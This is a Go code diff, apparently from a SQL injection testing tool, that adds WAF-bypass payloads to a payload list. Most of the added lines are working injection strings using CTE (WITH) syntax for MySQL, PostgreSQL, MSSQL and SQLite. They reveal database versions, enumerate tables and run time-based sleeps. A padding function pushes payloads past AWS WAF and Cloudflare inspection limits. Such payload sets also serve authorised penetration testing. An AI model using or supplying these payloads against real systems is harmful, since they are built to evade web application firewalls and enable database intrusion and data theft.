@@ -396,6 +396,46 @@ var advancedWAFBypassPayloads = []Payload{
 	{Value: "'%2527%2520OR%25201=1--", Technique: TechBlind, DBType: Generic, Description: "Double URL encoding", WAFBypass: true},
 	// Scientific notation
 	{Value: "0e1 UNION SELECT 1--", Technique: TechUnion, DBType: MySQL, Description: "Scientific notation bypass", WAFBypass: true},
+
+	// CTE (Common Table Expression) — WITH clause bypasses WAFs that
+	// block UNION SELECT but not WITH...AS. Supported on MySQL 8+,
+	// PostgreSQL, MSSQL, SQLite 3.8.3+, Oracle.
+	{Value: "') UNION SELECT * FROM (WITH t AS (SELECT 1) SELECT * FROM t)x--", Technique: TechUnion, DBType: Generic, Description: "CTE UNION bypass (generic)", WAFBypass: true},
+	{Value: "';WITH t AS (SELECT @@version AS v) SELECT v FROM t--", Technique: TechUnion, DBType: MSSQL, Description: "CTE stacked MSSQL version", WAFBypass: true},
+	{Value: "' UNION SELECT 1 FROM (WITH t AS (SELECT 1 c) SELECT c FROM t)x--", Technique: TechUnion, DBType: MySQL, Description: "CTE UNION MySQL 8+", WAFBypass: true},
+	{Value: "' UNION WITH t AS (SELECT version()) SELECT * FROM t--", Technique: TechUnion, DBType: PostgreSQL, Description: "CTE UNION PostgreSQL version", WAFBypass: true},
+	{Value: "' UNION WITH t AS (SELECT sqlite_version() v) SELECT v FROM t--", Technique: TechUnion, DBType: SQLite, Description: "CTE UNION SQLite version", WAFBypass: true},
+	// Recursive CTE for data extraction
+	{Value: "';WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<100) SELECT n FROM t--", Technique: TechBlind, DBType: PostgreSQL, Description: "Recursive CTE data gen PostgreSQL", WAFBypass: true},
+	{Value: "';WITH t AS (SELECT name FROM sqlite_master LIMIT 1) SELECT * FROM t--", Technique: TechUnion, DBType: SQLite, Description: "CTE table enum SQLite", WAFBypass: true},
+	// CTE time-based
+	{Value: "';WITH t AS (SELECT pg_sleep(3)) SELECT * FROM t--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "CTE time-based PostgreSQL", WAFBypass: true},
+	{Value: "';WITH t AS (SELECT SLEEP(3)) SELECT * FROM t--", Technique: TechTimeBased, DBType: MySQL, Description: "CTE time-based MySQL 8+", WAFBypass: true},
+	{Value: "';WITH t AS (SELECT 1) WAITFOR DELAY '0:0:3'--", Technique: TechTimeBased, DBType: MSSQL, Description: "CTE + WAITFOR MSSQL", WAFBypass: true},
+	// Nested CTE for multi-step extraction
+	{Value: "';WITH a AS (SELECT 1 x), b AS (SELECT x FROM a) SELECT * FROM b--", Technique: TechUnion, DBType: Generic, Description: "Nested CTE chain", WAFBypass: true},
+}
+
+// longPaddingPrefix generates a padding string that pushes the payload
+// past common WAF inspection limits (Cloudflare ~128KB, AWS WAF ~8KB,
+// ModSecurity default ~128KB). The WAF inspects only the first N bytes
+// and sees benign content; the actual payload lands after the limit.
+func longPaddingPrefix(size int) string {
+	pad := make([]byte, size)
+	for i := range pad {
+		pad[i] = 'A'
+	}
+	return string(pad)
+}
+
+// GetLongPayloadBypassPayloads returns payloads padded to bypass WAF body
+// inspection limits. Two sizes: 8KB (AWS WAF) and 128KB (Cloudflare/ModSec).
+func GetLongPayloadBypassPayloads() []Payload {
+	return []Payload{
+		// 8KB padding (bypasses AWS WAF default limit)
+		{Value: longPaddingPrefix(8192) + "&injected=' OR 1=1--", Technique: TechBlind, DBType: Generic, Description: "8KB padding WAF bypass (AWS)", WAFBypass: true},
+		{Value: longPaddingPrefix(8192) + "&injected=' UNION SELECT 1--", Technique: TechUnion, DBType: Generic, Description: "8KB padding UNION bypass", WAFBypass: true},
+	}
 }
 
 // oastExfilPayloads exfiltrate query results out-of-band via DNS or
